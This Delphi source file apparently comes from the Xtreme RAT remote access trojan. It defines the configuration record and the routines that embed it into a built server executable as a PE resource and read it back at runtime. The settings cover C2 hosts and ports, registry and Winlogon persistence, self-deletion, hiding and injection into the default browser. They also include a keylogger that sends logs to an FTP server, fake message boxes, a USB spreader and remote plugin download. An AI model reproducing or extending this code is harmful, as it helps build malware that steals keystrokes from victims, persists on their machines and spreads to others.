unit UnitConfigs;

interface

uses
  windows;

type
  xArray = array [0..40] of WideChar;
  xLowArray = array [0..10] of WideChar;

const
  NUMMAXCONNECTION = 5;

function StrToArray(Str: widestring): xArray;
function StrToLowArray(Str: widestring): xLowArray;

type
  TConfiguracoes = record
    Ports: array [0..NUMMAXCONNECTION - 1] of integer;
    DNS: array [0..NUMMAXCONNECTION - 1] of xArray;
    Password: Cardinal;
    ServerID: xLowArray;
    PassID: xLowArray;
    GroupID: xLowArray;

    CopyServer: boolean;
    ServerFileName: xLowArray;
    ServerFolder: xLowArray;
    SelectedDir: integer;
    Melt: boolean;
    HideServer: boolean;
    InjectProcess: array [0..16] of WideChar;    // %DEFAULTBROWSER%
    Restart: boolean;
    HKLMRun: xLowArray;
    HKCURun: xLowArray;
    ActiveX: xArray;

    HKLMRunBool: boolean;
    HKCURunBool: boolean;
    ActiveXBool: boolean;
    MoreStartUpName: xLowArray;
    MoreStartUp: boolean;
    RunOnceBool: boolean;
    WinLoadBool: boolean;
    WinShellBool: boolean;
    RunPolicies: boolean;

    Versao: xLowArray;
    Persistencia: boolean;
    Mutex: xLowArray;
    MutexSair: array [0..SizeOf(xLowArray) + 5] of WideChar;
    MutexPersist: array [0..SizeOf(xLowArray) + 5] of WideChar;
    Delay: integer;

    ActiveKeylogger: boolean;
    KeyDelBackspace: boolean;
    SendFTPLogs: boolean;
    FTPAddress: xArray;
    FTPFolder: xArray;
    FTPUser: xArray;
    FTPPass: xArray;
    FTPFreq: integer;
    FTPDelLogs: boolean;
    RecordWords: xArray;

    UseFakeMessage: boolean;
    FakeMessageType: integer;
    FakeMessageAnswer: integer;
    FakeMessageCaption: xLowArray;
    FakeMessageText: array [0..80] of WideChar;

    USBSpreader: boolean;
	  CheckRealConfig: integer;
    PluginLink: array [0..255] of WideChar;
    DownloadPlugin: boolean;
  end;
pConfiguracoes = ^TConfiguracoes;

function WriteSettings(ServerFile: PWideChar; Settings: TConfiguracoes; xResourceName: pWideChar = nil): boolean;
function LoadSettings(xResourceName: pWideChar = nil): TConfiguracoes;

var
  ResourceName: pWideChar = 'XTREME';
  ConfiguracoesServidor: TConfiguracoes;
  
implementation

function WriteSettings(ServerFile: PWideChar; Settings: TConfiguracoes; xResourceName: pWideChar = nil): boolean;
var
  ResourceHandle: THandle;
begin
  if xResourceName = nil  then xResourceName := ResourceName;
  Result := False;

  ResourceHandle := BeginUpdateResourceW(ServerFile, False);
  if ResourceHandle <> 0 then
  begin
    Result := UpdateResourceW(ResourceHandle, MakeIntResourceW(10), PWideChar(xResourceName), 0, @Settings, SizeOf(TConfiguracoes));
    if Result then Result := EndUpdateResource(ResourceHandle, False);
  end;
end;

function LoadSettings(xResourceName: pWideChar = nil): TConfiguracoes;
var
  ResourceLocation: HRSRC;
  ResourceSize: dword;
  ResourceHandle: THandle;
  ResourcePointer: pointer;
begin
  if xResourceName = nil  then xResourceName := ResourceName;

  ResourceLocation := FindResourceW(hInstance, xResourceName, MakeIntResourceW(10));
  ResourceSize := SizeofResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  ResourcePointer := LockResource(ResourceHandle);
  if ResourcePointer <> nil then
  begin
    CopyMemory(@Result, ResourcePointer, ResourceSize);
    FreeResource(ResourceHandle);
  end;
end;

function StrToArray(Str: widestring): xArray;
begin
  ZeroMemory(@Result, SizeOf(xArray));
  if Str <> '' then CopyMemory(@Result, @Str[1], SizeOf(xArray));
end;

function StrToLowArray(Str: widestring): xLowArray;
begin
  ZeroMemory(@Result, SizeOf(xLowArray));
  if Str <> '' then CopyMemory(@Result, @Str[1], SizeOf(xLowArray));
end;

end.
